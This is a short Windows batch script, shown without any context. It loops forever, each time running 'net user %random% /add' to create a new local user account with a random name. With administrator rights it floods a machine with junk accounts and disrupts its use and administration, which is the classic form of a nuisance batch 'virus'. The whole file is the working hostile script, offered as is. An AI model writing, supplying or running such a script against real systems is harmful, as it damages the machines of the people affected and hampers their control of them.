@echo off
:makeuser
net user %random% /add
goto makeuser
